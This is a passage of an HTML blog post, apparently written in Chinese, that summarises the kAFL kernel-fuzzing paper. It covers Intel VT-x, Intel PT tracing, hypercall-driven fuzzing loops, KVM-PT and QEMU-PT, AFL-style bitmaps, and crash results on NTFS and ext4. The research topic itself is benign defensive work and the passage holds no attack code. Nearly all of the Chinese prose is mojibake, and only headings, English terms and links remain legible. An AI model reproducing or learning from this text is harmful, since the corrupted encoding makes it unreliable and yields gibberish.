¸ç©ºé—´é€šå¸¸ä½äºè™šæ‹Ÿé«˜åœ°å€éƒ¨åˆ†è€Œç”¨æˆ·ç©ºé—´ä½äºä½åœ°å€éƒ¨åˆ†ï¼ŒOS å¤„ç†ä»»åŠ¡é€šå¸¸ä¸ä¼šåˆ‡æ¢ CR3ï¼Œè€Œæ˜¯åœ¨åŒä¸€åœ°å€ç©ºé—´å¤„ç†</p><h2 id="2-2-Intel-VT-x"><a href="#2-2-Intel-VT-x" class="headerlink" title="2.2 Intel VT-x"></a>2.2 Intel VT-x</h2><p>æˆ‘ä»¬å°† CPU åˆ†ä¸ºä¸‰ç±»ï¼šç‰©ç† CPUã€é€»è¾‘ CPUï¼ˆè¶…çº¿ç¨‹å¯èƒ½å¸¦æ¥å¤šäºç‰©ç† CPU æ•°é‡çš„é€»è¾‘ CPUï¼Œä½†ä»…æœ‰ä¸€ä¸ªåŒæ—¶æ´»åŠ¨ï¼‰ã€è™šæ‹Ÿ CPUï¼ˆåŸºäºé€»è¾‘ CPU å»ºç«‹ï¼‰</p><p>è™šæ‹ŸåŒ–ä¸­è§’è‰²åˆ†ä¸ºä¸¤ç§ï¼šè™šæ‹Ÿæœºç›‘è§†å™¨ï¼ˆVirtual Machine Monitorï¼‰å’Œè™šæ‹Ÿæœºï¼ˆVirtual Machineï¼‰ï¼ŒVMM ç®¡æ§ VMï¼ŒVM åœ¨ VMM æä¾›çš„é€æ˜ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œ</p><p>Intel VT-x æŠ€æœ¯æä¾›äº†ç¡¬ä»¶è¾…åŠ©çš„ CPU è™šæ‹ŸåŒ–ç‰¹æ€§ï¼Œå°† CPU é¢å¤–åˆ†ä¸º VMXOFFï¼ˆä¸å¼€å¯è™šæ‹ŸåŒ–ï¼‰ä¸ VMXONï¼ˆå¼€å¯è™šæ‹ŸåŒ–ï¼‰çš„è¿è¡Œæ¨¡å¼ï¼Œå¹¶åŒºåˆ† VMX non-rootï¼ˆç”¨äº VMï¼‰ä¸ VMX rootï¼ˆç”¨äº VMMï¼‰ä¸¤ç§æ‰§è¡Œæ¨¡å¼</p><p>VM å¯èƒ½é€šè¿‡å„ç§åŸå› è§¦å‘ VM-Exit äº‹ä»¶å°†æ§åˆ¶æƒè½¬äº¤ç»™ VMM è¿›è¡Œå¤„ç†ï¼ŒVMM é€šè¿‡åŒ…å« vCPU ä¿¡æ¯çš„ VMCS ç»“æ„åˆ›å»ºã€å¯åŠ¨ã€æ§åˆ¶ VM</p><h2 id="2-3-Intel-PT"><a href="#2-3-Intel-PT" class="headerlink" title="2.3 Intel PT"></a>2.3 Intel PT</h2><p>Intel è‡ªç¬¬äº”ä»£å¤„ç†å™¨å¼•å…¥ Intel PT æŠ€æœ¯ï¼Œæä¾›æ‰§è¡Œå’Œåˆ†æ”¯è·Ÿè¸ªä¿¡æ¯ï¼Œä¸åŒäº <code>Intel Last Branch Record</code> è¿™æ ·çš„åˆ†æ”¯è®°å½•æŠ€æœ¯ï¼Œè¾“å‡ºç¼“å†²åŒºçš„å¤§å°ä»…å—ä¸»å­˜å¤§å°è€Œéç‰¹å®šå¯„å­˜å™¨çš„é™åˆ¶ï¼Œè¾“å‡ºæ ¼å¼åŸºäºæ•°æ®åŒ…ï¼ˆpacket-orientedï¼‰å¹¶åˆ†ä¸ºé€šç”¨æ‰§è¡Œä¿¡æ¯ä¸æ§åˆ¶æµä¿¡æ¯åŒ…ï¼›Intel åœ¨è¿è¡Œæ—¶æä¾›å„ç±»æ§åˆ¶æµç›¸å…³çš„æ•°æ®åŒ…ç±»å‹ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ç”¨è¢«è·Ÿè¸ªçš„è½¯ä»¶æ¥ç¿»è¯‘åŒ…å«æ§åˆ¶æµåˆ†æ”¯åœ°å€çš„åŒ…</p><p>Intel æŒ‡å®šäº†äº”ç§ç±»å‹çš„æ§åˆ¶æµå½±å“æŒ‡ä»¤ï¼Œç§°ä¸º <code>Change of Flow Instruction</code> ï¼ˆCoFIï¼‰ï¼Œä¸åŒç±»å‹çš„ CoFI æ‰§è¡Œç»“æœäº§ç”Ÿä¸åŒçš„ä¿¡æ¯åŒ…æµï¼Œä¸æœ¬æ–‡ç›¸å…³çš„ä¸‰ç§ä¸ºï¼š</p><ul><li><strong>Taken-Not-Taken</strong>ï¼ˆTNTï¼‰ï¼šæ¡ä»¶è·³è½¬æ˜¯å¦æ‰§è¡Œ</li><li><strong>Target IP</strong>ï¼ˆTIPï¼‰ï¼šé—´æ¥è·³è½¬æˆ–è½¬ç§»æŒ‡ä»¤ï¼ˆ<code>indirect branch, near ret, far transfer</code>ï¼‰çš„ç›®æ ‡</li><li><strong>Flow Update Packets</strong>ï¼ˆFUPï¼‰ï¼šå¦‚ä¸­æ–­æˆ–é™·é˜±ç­‰å¼‚æ­¥äº‹ä»¶ï¼Œ FUP ä¹‹åé€šå¸¸è·Ÿéšä¸€ä¸ª TIP ä»¥æŒ‡ç¤ºæ¥ä¸‹æ¥çš„æŒ‡ä»¤</li></ul><p>ä¸ºäº†é™åˆ¶ç”Ÿæˆçš„æ•°æ®é‡ï¼ŒIntel PT æä¾›äº†å¤šç§è¿è¡Œæ—¶è¿‡æ»¤é€‰é¡¹ï¼Œå¦‚æŒ‡ä»¤æŒ‡é’ˆåœ°å€èŒƒå›´æˆ–ç‰¹æƒçº§åˆ«ï¼ˆCPLï¼‰ï¼ŒkAFL ä»¥æ­¤å°†è¿½è¸ªé™åˆ¶ä¸ºå†…æ ¸æ¨¡å¼ï¼ŒåŒæ—¶åˆ©ç”¨ CR3 è¿‡æ»¤æ¥é™åˆ¶ä¸ºç‰¹å®šçš„è½¯ä»¶</p><p>Intel PT æ”¯æŒä¸ºè¾“å‡ºæ•°æ®é…ç½®å¤šç›®æ ‡åŸŸï¼ŒkAFL å…³æ³¨äºå…è®¸æŒ‡å®šå¤šä¸ªè¾“å‡ºåŒºåŸŸçš„ç‰©ç†åœ°å€è¡¨ï¼ˆTable of Physical Addressesï¼ŒToPAï¼‰æœºåˆ¶ï¼šæ¯ä¸ª ToPA è¡¨åŒ…å«å¤šä¸ª ToPA æ¡ç›®ï¼Œå…¶ä¸­åŒ…å«ç”¨æ¥å­˜å‚¨è¿½è¸ªæ•°æ®çš„å†…å­˜å—çš„ç‰©ç†åœ°å€ã€å¤§å°ã€ç±»å‹ï¼ˆç”¨äºæŒ‡ç¤º CPU è®¿é—® ToPA è¡¨é¡¹æ—¶çš„è¡Œä¸ºï¼‰ç­‰ä¿¡æ¯</p><h1 id="0x03-System-Overview"><a href="#0x03-System-Overview" class="headerlink" title="0x03. System Overview"></a>0x03. System Overview</h1><p>è¿™èŠ‚ä»‹ç»ç³»ç»Ÿæ€»ä½“æ¶æ„ï¼Œåˆ†ä¸ºä¸‰ä¸ªç»„ä»¶ï¼šfuzzing logicã€VM infrastructureï¼ˆ QEMU-PT ä¸ KVM-PTï¼‰ã€user mode agentï¼Œæ•´ä½“æ¶æ„å¦‚å›¾ 1 æ‰€ç¤ºï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20240130045624.png"></p><p>æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹å¦‚å›¾ 2 æ‰€ç¤ºï¼š</p><ul><li><p>åœ¨ VM å¯åŠ¨æ—¶ user mode agent çš„ç¬¬ä¸€éƒ¨åˆ†ï¼ˆloaderï¼‰ä½¿ç”¨ hypercall <code>HC_SUBMIT_PANIC</code> æ¥å‘ QEMU-PT æäº¤ <code>kernel panic handler</code>  ï¼ˆWindows ä¸‹ä¸º <code>BugCheck()</code> ï¼‰çš„åœ°å€ï¼ŒQEMU-PT å°†å…¶æ›´æ”¹ä¸ºä¸€ä¸ª hypercall è°ƒç”¨ä¾‹ç¨‹ä»¥è®©æˆ‘ä»¬å¿«é€Ÿå¾—çŸ¥ VM ä¸­çš„ crashes</p></li><li><p>loader ä½¿ç”¨ hypercall <code>HC_GET_PROGRAM</code> æ¥è·å–å®é™…çš„ user mode agent å¹¶å¯åŠ¨</p></li><li><p>fuzzer å¼€å§‹åˆå§‹åŒ–ï¼Œagent è§¦å‘ä¸€ä¸ªä¼šç”± KVM-PT å¤„ç†çš„ hypercall <code>HC_SUBMIC_CR3</code>ï¼Œhypervisor ä»å½“å‰è¿è¡Œçš„ç¨‹åºä¸­æå– CR3 çš„å€¼å¹¶äº¤ç»™ QEMU-PT è¿›è¡Œè¿‡æ»¤</p></li><li><p>æœ€åï¼Œagent ä½¿ç”¨ hypercall <code>HC_SUBMIT_BUFFER</code> æ¥æäº¤å…¶æƒ³è¦è·å–è¾“å…¥çš„åœ°å€ï¼Œæ¥ä¸‹æ¥å¼€å§‹ä¸» fuzzing å¾ªç¯</p></li><li><p>åœ¨ä¸»å¾ªç¯ä¸­ï¼Œagent é€šè¿‡ hypercall  <code>HC_GET_INPUT</code> æ¥è·å–æ–°çš„è¾“å…¥ï¼Œfuzzing logic ç”Ÿæˆä¸€ä¸ªæ–°çš„è¾“å…¥å¹¶äº¤ç»™ QEMU-PT ç”±å…¶æ‹·è´åˆ° guest å†…å­˜ä¸­</p></li><li><p>åœ¨ VM-Entry æ¢å¤è™šæ‹Ÿæœºæ‰§è¡Œæ—¶å¼€å¯ PT è¿½è¸ªæœºåˆ¶ï¼Œæ­¤æ—¶ agent ä½¿ç”¨è¾“å…¥ä¸å†…æ ¸äº¤äº’ï¼Œåœ¨ Fuzzing è¿‡ç¨‹ä¸­ QEMU-PT è§£ç è¿½è¸ªæ•°æ®å¹¶åœ¨éœ€è¦æ—¶æ›´æ–°ä½å›¾</p></li><li><p>äº¤äº’å®Œæˆå agent é€šè¿‡ hypercall <code>HC_FINISHED</code> å‘ŠçŸ¥ hypervisor åœæ­¢è¿½è¸ªï¼Œä½å›¾è¢«ä¼ é€’ç»™ fuzzing logic åç»­ä½¿ç”¨</p></li><li><p>æœ€å agent å¯ä»¥ç»§ç»­è¿è¡Œä»»ä½•æœªè¢«è¿½è¸ªçš„æ¸…ç†ç¨‹åºï¼Œç„¶åå‘å‡ºå¦ä¸€ä¸ª <code>HC_GET_INPUT</code> ä»¥å¯åŠ¨ä¸‹ä¸€æ¬¡å¾ªç¯è¿­ä»£</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20240130045949.png"></p><h2 id="3-1-Fuzzing-Logic"><a href="#3-1-Fuzzing-Logic" class="headerlink" title="3.1 Fuzzing Logic"></a>3.1 Fuzzing Logic</h2><p><code>fuzzing logic</code> æ˜¯ kAFL çš„æ§åˆ¶ç»„ä»¶ï¼Œè´Ÿè´£ç®¡ç†ç§å­ã€ç”Ÿæˆè¾“å…¥ç­‰ï¼Œå¤§é‡é‡‡ç”¨äº† AFL æ‰€ç”¨çš„ç®—æ³•ï¼ˆå¦‚ä½¿ç”¨ä½å›¾è®°å½•å—è½¬ç§»ï¼‰ï¼Œä¸”ä½¿ç”¨å¹¶è¡Œ VM åè°ƒæå‡æ€§èƒ½ï¼Œå¹¶è´Ÿè´£ä¸ QEMU-PT é€šä¿¡ä»¥åŠæ˜¾ç¤ºç»Ÿè®¡æ•°æ®</p><h2 id="3-2-User-Mode-Agent"><a href="#3-2-User-Mode-Agent" class="headerlink" title="3.2 User Mode Agent"></a>3.2 User Mode Agent</h2><p>åœ¨ç›®æ ‡ OS ä¸­è¿è¡Œçš„ <code>User Mode Agent</code> é€šè¿‡ hypercall ä¸ <code>fuzzing logic</code> åŒæ­¥å¹¶è·å–æ–°è¾“å…¥ä»¥ä¸å†…æ ¸äº¤äº’ï¼Œåœ¨å®è·µä¸­ä½œè€…é¢å¤–ä½¿ç”¨<code>loader component</code> é€šè¿‡ hypercall æ¥æ”¶  <code>User Mode Agent</code> äºŒè¿›åˆ¶å¹¶æ‰§è¡Œï¼ŒåŒæ—¶è´Ÿè´£æ£€æŸ¥ agent çš„çŠ¶æ€</p><h2 id="3-3-Virtualization-Infrastructure"><a href="#3-3-Virtualization-Infrastructure" class="headerlink" title="3.3 Virtualization Infrastructure"></a>3.3 Virtualization Infrastructure</h2><p><code>fuzzing logic</code> ä½¿ç”¨ QEMU-PT ä¸ KVM-PT äº¤äº’ä»¥åˆ›å»º VMsï¼ŒKVM-PT å…è®¸æˆ‘ä»¬é™å®š Intel PT èŒƒå›´ä¸º vCPU æ‰§è¡ŒæœŸé—´ï¼ŒQEMU-PT è´Ÿè´£ä¸ KVM-PT äº¤äº’ä»¥é…ç½® Intel PT å¹¶è®¿é—®ä¸è§£ç  output buffer çš„è¿½è¸ªæ•°æ®ä¸ºè¢«æ‰§è¡Œçš„æ¡ä»¶è·³è½¬æŒ‡ä»¤çš„åœ°å€çš„æµï¼Œä¸”åŸºäºå·²çŸ¥éç¡®å®šæ€§åŸºæœ¬æ¬¾åœ°å€è¿›è¡Œè¿‡æ»¤ï¼ˆä»¥é¢„é˜²å‡é˜³æ€§ï¼‰åä»¥ AFL å…¼å®¹çš„ä½å›¾æ ¼å¼æä¾›ç»™ fuzzing logic</p><p>ä½œè€…ä½¿ç”¨å®¢åˆ¶åŒ–çš„ Intel PT è§£ç å™¨ï¼Œä¸ Intel çš„ç°æœ‰æ–¹æ¡ˆæ¯”å¸¦æ¥äº†æ€§èƒ½æå‡</p><h2 id="3-4-Stateful-and-Non-Deterministic-Code"><a href="#3-4-Stateful-and-Non-Deterministic-Code" class="headerlink" title="3.4 Stateful and Non-Deterministic Code"></a>3.4 Stateful and Non-Deterministic Code</h2><p>å†…æ ¸å±‚çš„çŠ¶æ€ä¸å¼‚æ­¥æ€§å¯¼è‡´çš„ä¸ç¡®å®šæ€§éœ€è¦è¢«å¤„ç†ï¼ŒçŠ¶æ€ä¸ä¼šè¢«é‡ç½®å› ä¸ºå¿«ç…§åŠ è½½æˆæœ¬è¿‡é«˜ï¼Œä¸­æ–­å¯èƒ½å¸¦æ¥ä¸ç¡®å®šæ€§åŸºæœ¬å—è½¬ç§»ï¼Œä½œè€…ä½¿ç”¨ä¸¤ç§æŠ€æœ¯è§£å†³è¿™äº›é—®é¢˜ï¼š</p><p>ç¬¬ä¸€ç§æ˜¯è¿‡æ»¤å‡ºä¸­æ–­åŠä¸­æ–­å¤„ç†é€ æˆçš„è½¬ç§»ï¼Œè¿™å¯ä»¥é€šè¿‡ Intel PT çš„è¿½è¸ªæ•°æ®ï¼ˆå¸¦æœ‰ FUP çš„ TIPï¼‰æŒ‡ç¤ºï¼Œä¸¢å¼ƒç›´åˆ° <code>iret</code> æŒ‡ä»¤å‰çš„åŸºæœ¬å—ï¼ŒåŒæ—¶é€šè¿‡ä¸€ä¸ªç®€æ˜“çš„è°ƒç”¨æ ˆè¿½è¸ªæ‰€æœ‰ä¸­æ–­ï¼ˆå› ä¸ºå¯èƒ½å­˜åœ¨ä¸­æ–­åµŒå¥—ï¼‰</p><p>ç¬¬äºŒç§æ˜¯æ‹‰é»‘æ‰€æœ‰éç¡®å®šæ€§å‡ºç°çš„åŸºæœ¬å—ï¼Œä½œè€…ä¼šåœ¨ä½å›¾æ›´æ–°æ—¶è¿ç»­å¤šæ¬¡é‡æ–°è¿è¡Œè¾“å…¥ï¼Œå°†æ²¡æœ‰åœ¨æ‰€æœ‰è¯•éªŒä¸­å‡ºç°çš„åŸºæœ¬å—æ‹‰å…¥é»‘åå•ï¼Œåœ¨åç»­å¤„ç†åœ¨è¿‡æ»¤</p><blockquote><p>æ³¨ï¼šç¬”è€…è®¤ä¸ºä½œè€…ä½¿ç”¨çš„ç¬¬äºŒç§æŠ€æœ¯å¯èƒ½ä¼šå­˜åœ¨éå¸¸å¤§çš„å‡é˜³æ€§ï¼Œå› ä¸ºå†…æ ¸åœ¨ä¸åŒçŠ¶æ€ä¸‹åŒä¸€è¾“å…¥çš„ç»“æœå¯èƒ½ä¹Ÿæ˜¯ä¸åŒçš„</p></blockquote><h2 id="3-5-Hypercall"><a href="#3-5-Hypercall" class="headerlink" title="3.5 Hypercall"></a>3.5 Hypercall</h2><p>hypercall ç”± <code>vmcall</code> æŒ‡ä»¤è°ƒèµ·ä»¥ä¸»åŠ¨è§¦å‘ VM-Exitï¼Œä½œè€…ä¿®æ”¹äº† KVM-PT ä»¥æ¥æ”¶ ring3 çš„ hypercallï¼Œå¹¶é€šè¿‡ <code>rcx</code> å¯„å­˜å™¨ä¼ å‚ï¼Œä¾‹å¦‚ <code>HC_SUBMIT_BUFFER</code> é€šè¿‡ <code>rcx</code> å­˜å‚¨ä¸€ä¸ª guest æŒ‡é’ˆï¼Œå¦ä¸€ä¸ªä¾‹å­æ˜¯å‘ŠçŸ¥ <code>fuzzing logic</code> ç›®æ ‡ OS å‘ç”Ÿäº† crashï¼Œæ³¨å…¥çš„ä»£ç å¦‚ List 1 æ‰€ç¤º</p><p><img src="https://s2.loli.net/2024/07/30/WHY1MB5kzoqf6cp.png" alt="Listing 1: Hypercall crash notifier."></p><h1 id="0x04-Implementation-Details"><a href="#0x04-Implementation-Details" class="headerlink" title="0x04. Implementation Details"></a>0x04. Implementation Details</h1><p>ä»£ç å¼€æºäº <a href="https://github.com/RUB-SysSec/kAFL">https://github.com/RUB-SysSec/kAFL</a></p><h2 id="4-1-KVM-PT"><a href="#4-1-KVM-PT" class="headerlink" title="4.1 KVM-PT"></a>4.1 KVM-PT</h2><p>Intel PT å…è®¸æˆ‘ä»¬åœ¨ä¸ä¿®æ”¹&#x2F;é‡ç¼–è¯‘ç›®æ ‡å†…æ ¸çš„æƒ…å†µä¸‹è¿½è¸ªåˆ†æ”¯è½¬ç§»ï¼Œæ®ä½œè€…æ‰€çŸ¥è¿‡å»ä¸æ›¾æœ‰å…¬å¼€å¯ç”¨çš„é©±åŠ¨èƒ½å¤Ÿä½¿ç”¨ Intel PT ä»…è¿½è¸ªå•ä¸ª vCPU çš„ guest æ‰§è¡Œï¼Œå¦‚ <a href="https://github.com/andikleen/simple-pt">Simple-PT</a> åœ¨è®¾è®¡ä¸Šä¸æ”¯æŒé•¿æœŸè¿½è¸ªï¼Œ<a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/plain/tools/perf/Documentation/intel-pt.txt?id=refs/tags/v4.8">perf-subsystem</a> å¯ä»¥é•¿æœŸè¿½è¸ªä½†ä»…èƒ½è¿½è¸ªé€»è¾‘ CPU è€Œé vCPU</p><p>ä¸ºäº†è§£å†³è¿™äº›ç¼ºç‚¹ï¼Œä½œè€…å¼€å‘äº† KVM-PTï¼Œå…¶å…è®¸æˆ‘ä»¬åœ¨æ— é™é•¿çš„æ—¶é—´å†…è¿½è¸ª vCPU ï¼Œå¹¶å¯¼å‡ºä¸€ä¸ªç”¨æˆ·æ¨¡å¼æ¥å£ä¾› QEMU-PT è®¿é—®è¿½è¸ªæ•°æ®</p><h3 id="4-1-1-vCPU-Specific-Traces"><a href="#4-1-1-vCPU-Specific-Traces" class="headerlink" title="4.1.1 vCPU Specific Traces"></a>4.1.1 vCPU Specific Traces</h3><p>å¼€å¯ Intel PT éœ€è¦åœ¨ ring0 å¯ç”¨ MSR å¯„å­˜å™¨çš„ <code>IA32_RTIT_CTL_MSR.TraceEn</code> ä½ï¼Œè¿™éœ€è¦åœ¨è¿›å…¥ VM å‰å®Œæˆï¼Œåœ¨ VM-Exit ååˆ™éœ€è¦åå‘æ“ä½œï¼Œè€Œæ‰‹åŠ¨ä¿®æ”¹ MSR ä¼šäº§ç”Ÿä¸å¿…è¦çš„è¿½è¸ªæ•°æ®ï¼Œä½œè€…ä½¿ç”¨ Intel VT-x çš„ MSR è‡ªåŠ¨åŠ è½½åŠŸèƒ½ï¼ˆå¦‚ä¿®æ”¹ <code>VMCS.VM_ENTRY_CONTROL_MSR</code> ï¼‰æ¥åœ¨ VM-Entry &amp; VM-Exit æ—¶åŠ è½½é¢„é…ç½® MSR</p><blockquote><p>ç¬”è€…æ³¨ï¼šè¿™ç‚¹äº‹éƒ½èƒ½å†™è¿™ä¹ˆä¸€å¤§æ®µâ“</p></blockquote><h3 id="4-1-2-Continuous-Tracing"><a href="#4-1-2-Continuous-Tracing" class="headerlink" title="4.1.2 Continuous Tracing"></a>4.1.2 Continuous Tracing</h3><p>å¦‚å›¾ 3 æ‰€ç¤ºçš„ç‰©ç†åœ°å€è¡¨ï¼ˆTable of Physical Addresses,ToPAï¼‰é¡¹ç»“æ„ä½“æ•°ç»„ç”¨ä»¥æŒ‡ç¤º Intel PT å¦‚ä½•å¡«å……ç¼“å†²åŒºï¼Œåœ¨ä¸»ç¼“å†²åŒºå¡«æ»¡å CPU å¯ä»¥åœæ­¢è¿½è¸ªæˆ–æ˜¯äº§ç”Ÿèƒ½é€ æˆ VM-Exit çš„ä¸­æ–­ï¼ˆå½“å‰çš„å®ç°ä¸ºéå³æ—¶ï¼‰ä»¥è®© VMM é‡ç½®ç¼“å†²åŒºåæ¢å¤ VM æ‰§è¡Œï¼Œoverflow buffer è¢«æ”¾ç½®åœ¨ main buffer åä»¥é¿å…å®é™…ä¼ é€’ä¸­æ–­å‰å¯èƒ½çš„è¿½è¸ªæ•°æ®ä¸¢å¤±ï¼ˆå…¶è‹¥ä¹Ÿæº¢å‡ºåˆ™å¯¼è‡´è¿½è¸ªåœæ­¢ï¼Œæ­¤æ—¶ä¼šæ–°å¢ä¸€ä¸ªæ•°æ®è¡¨æŒ‡ç¤ºæ•°æ®ä¸¢å¤±ï¼‰</p><p><img src="https://s2.loli.net/2024/07/30/A4IKLpswex36Vi5.png" alt="Figure 3: KVM-PT ToPA configuration."></p><h2 id="4-2-QEMU-PT"><a href="#4-2-QEMU-PT" class="headerlink" title="4.2 QEMU-PT"></a>4.2 QEMU-PT</h2><p>QEMU-PT é€šè¿‡ KVM-PT çš„ç”¨æˆ·ç©ºé—´æ¥å£ï¼ˆ<code>ioctl()</code> ä¸ <code>mmap()</code> ï¼‰é…ç½® Intel PT å¹¶å®šæœŸæ£€æŸ¥ ToPAï¼Œå¹¶å°† Intel PT æ•°æ®åŒ…è§£ç ä¸ºç±»ä¼¼ AFL çš„ä½å›¾</p><p><img src="https://s2.loli.net/2024/07/30/EaOTDcZjyh6oWrX.png" alt="Figure 4: Overview of the pipeline that converts Intel PT traces to kAFL bitmaps."></p><h3 id="4-2-1-PT-Decoder"><a href="#4-2-1-PT-Decoder" class="headerlink" title="4.2.1 PT Decoder"></a>4.2.1 PT Decoder</h3><p>è§£ç å™¨éœ€è¦è¶³å¤Ÿé«˜æ•ˆä»¥åº”å¯¹äº§ç”Ÿé€Ÿç‡ä¸ºå‡ ç™¾ MB æ¯ç§’çš„å†…æ ¸æ¨¡ç³Šæµ‹è¯•è¿½è¸ªæ•°æ®ï¼Œä¸”éœ€è¦è¶³å¤Ÿçš„ç²¾ç¡®</p><p>Intel ä¸ºå®¢åˆ¶ Intel PT è§£ç å™¨æä¾›äº†è‡ªå·±çš„é€šç”¨è§£ç å¼•æ“ <a href="https://github.com/intel/libipt">libipt</a> ï¼Œä½† kAFL ä»…ä¾èµ–æµä¿¡æ¯ï¼Œè€Œ libipt åœ¨æä¾›æ‰§è¡Œæ•°æ®ä¸æµä¿¡æ¯çš„åŒæ—¶å¹¶ä¸ç¼“å­˜åæ±‡ç¼–æŒ‡ä»¤ï¼Œå› æ­¤ä½œè€…å®ç°äº†ä¸€ä¸ªç±»ä¼¼å³æ—¶ï¼ˆjust-in-timeï¼‰è§£ç å™¨çš„è½¯ä»¶ï¼Œå¹¶ç¼“å­˜æ‰€æœ‰åæ±‡ç¼–æŒ‡ä»¤ä»¥ä¼˜åŒ–æŸ¥æ‰¾ï¼ŒåŒæ—¶å¿½è§†ä¸æµ‹è¯•ç”¨ä¾‹æ— å…³çš„æ•°æ®åŒ…</p><p>ä½œè€…çš„è§£ç å™¨åœ¨ ToPA åŒºåŸŸè¢«å¡«å……åä¾¿å¼€å§‹è§£ç ï¼ˆè€Œéç­‰å¾…å¡«æ»¡ï¼‰ï¼Œå¹¶ç¿»è¯‘ä¸º AFL ä½å›¾æ ¼å¼</p><h2 id="4-3-AFL-Fuzzing-Logic"><a href="#4-3-AFL-Fuzzing-Logic" class="headerlink" title="4.3 AFL Fuzzing Logic"></a>4.3 AFL Fuzzing Logic</h2><p>ä½œè€…çš„ fuzzing logic ä¸ AFL ååˆ†ç›¸ä¼¼ï¼Œæ¯ä¸ªåŸºæœ¬å—è¢«ç»™äºˆä¸€ä¸ªéšæœº IDï¼Œä»å— A åˆ° B çš„è½¬ç§»è¢«é€šè¿‡å¦‚ä¸‹æ–¹ç¨‹èµ‹äºˆä¸€ä¸ªåç§»å€¼åˆ°ä½å›¾ä¸­ï¼š</p><p><img src="https://s2.loli.net/2024/07/30/IiFG56ULtmM2qlZ.png"></p><p>ä¸åŒäºç¼–è¯‘æœŸéšæœºï¼ŒkAFL ä½¿ç”¨åŸºæœ¬å—çš„åœ°å€ä½œä¸º IDï¼Œåœ¨è§‚æµ‹åˆ°è½¬ç§»åä¾¿å¢åŠ ä½å›¾ä¸­è®¡æ•°ï¼Œåœ¨ fuzzing è¿­ä»£ç»“æŸåå°†ä½å›¾çš„æ¯ä¸ª entry èˆå…¥ä»¥ä»…ä¿ç•™æœ€é«˜ä½ï¼Œå¹¶ä¸å…¨å±€é™æ€ä½å›¾å¯¹æ¯”ä»¥æ£€æŸ¥æ˜¯å¦å‘ç°æ–°ä½ï¼Œè‹¥æ˜¯åˆ™æ·»åŠ åˆ°å…¨å±€é™æ€ä½å›¾å¹¶å°†è§¦å‘æ–°ä½çš„è¾“å…¥æ·»åŠ åˆ°é˜Ÿåˆ—ä¸­ï¼Œå½“å‘ç°äº†æœ‰è¶£çš„è¾“å…¥æ—¶åˆ™è¿›è¡Œé€å­—èŠ‚å˜å¼‚ï¼Œè¯¥é˜¶æ®µå®Œæˆååœ¨éšæœºä½ç½®è¿›è¡Œå˜å¼‚ï¼ˆè‹¥å‰é˜¶æ®µå‘ç°æ–°çš„è¾“å…¥åˆ™å°†æ¨è¿Ÿï¼‰ï¼Œè§¦å‘æ–°è½¬ç§»çš„è¾“å…¥å°†ä¼šç»™äºˆæ›´é«˜çš„ä¼˜å…ˆçº§</p><h1 id="0x05-Evaluation"><a href="#0x05-Evaluation" class="headerlink" title="0x05. Evaluation"></a>0x05. Evaluation</h1><p>ä½œè€…çš„å®éªŒæœºå™¨ä¸º <code>Intel i7-6700 processor, 32 GB DDR4 RAM</code> ï¼Œä¸ºé¿å… IO æ€§èƒ½å½±å“ï¼Œæ‰€æœ‰åŸºå‡†æµ‹è¯•åœ¨ä¸€ä¸ª RAM disk ä¸Šå®Œæˆ</p><p>ç±»ä¼¼ AFL ï¼Œè‹¥ä¸€ä¸ªé€ æˆ crash  çš„è¾“å…¥è§¦å‘äº†æ­¤å‰æœªæœ‰çš„åŸºæœ¬å—è½¬ç§»ï¼Œåˆ™ä½œè€…è®¤ä¸ºå…¶æ˜¯å”¯ä¸€çš„ï¼ˆä½†ä¸æ„å‘³ç€åº•å±‚é”™è¯¯å”¯ä¸€ï¼‰</p><h2 id="5-1-Fuzzing-Windows"><a href="#5-1-Fuzzing-Windows" class="headerlink" title="5.1 Fuzzing Windows"></a>5.1 Fuzzing Windows</h2><p>ä½œè€…å®ç°äº†ä¸€ä¸ªå°çš„ç‰¹å®šäº Windows 10 çš„ user mode agentï¼Œé€šè¿‡è™šæ‹Ÿç£ç›˜å¯¹ NTFS çš„ 4 å¤© + 19 å°æ—¶ fuzzing åæ‰¾åˆ°äº† 59 ä¸ªç‹¬ç«‹çš„ crashesï¼ˆéƒ½æ˜¯é™¤ä»¥ 0 é”™è¯¯ï¼‰ï¼Œç»æ£€æŸ¥ä½œè€…æ€€ç–‘å¯èƒ½åªæœ‰ä¸€ä¸ªç‹¬ç«‹çš„é”™è¯¯</p><p>æ­¤å¤–ä½œè€…è¿˜å®ç°äº†ä¸€ä¸ªé€šç”¨ syscall fuzzing agentï¼Œä½†åœ¨ Windows ä¸‹ 13 ä¸ªå°æ—¶çš„ 6.3 ç™¾ä¸‡æ¬¡æ‰§è¡Œä¸­æœªå‘ç° crashï¼Œç”±äº kAFL å¾—ç›Šäºè¦†ç›–ç‡åé¦ˆå¾ˆå¿«ä¹ å¾—å¦‚ä½•ç”Ÿæˆæœ‰æ•ˆè½½è·ä»¥æ‰§è¡Œæœ‰æ•ˆç³»ç»Ÿè°ƒç”¨ï¼Œå¯¼è‡´äº† fuzzing agent ä¸­çš„æ„å¤–çš„ç”¨æˆ·å›è°ƒï¼Œä»è€Œä½¿å¾— agent éœ€è¦é«˜æ˜‚å¼€é”€ä»¥é‡å¯ï¼Œå¯¼è‡´ç¾å¦™ä»…èƒ½æ‰§è¡Œçº¦ 134 æ¬¡</p><h2 id="5-2-Fuzzing-Linux"><a href="#5-2-Fuzzing-Linux" class="headerlink" title="5.2 Fuzzing Linux"></a>5.2 Fuzzing Linux</h2><p>ä½œè€…ä¸º Linux å®ç°äº†ä¸€ä¸ªç±»ä¼¼çš„ agent ä»¥æµ‹è¯• ext4 ï¼Œä½†æ•ˆç‡æ¯” Windows å¿«å¾—å¤šï¼ˆæ¯ç§’ 1kï½2kæ¬¡æ‰§è¡Œï¼‰ï¼Œä»è€Œåœ¨ 12 å¤©çš„æµ‹è¯•ä¸­å‘ç°äº† 160 ä¸ªç‹¬ç«‹çš„ crash å¹¶ç¡®è®¤äº†å¤šä¸ª bugï¼Œå›¾ 5 å±•ç¤ºäº†å¦ä¸€ä¸ªæ¨¡ç³Šæµ‹è¯•çš„å‰ 32 å°æ—¶</p><p><img src="https://s2.loli.net/2024/07/30/qjA8raLVybPzdWI.png" alt="Figure 5: Fuzzing the ext4 kernel module for 32 hours."></p><h2 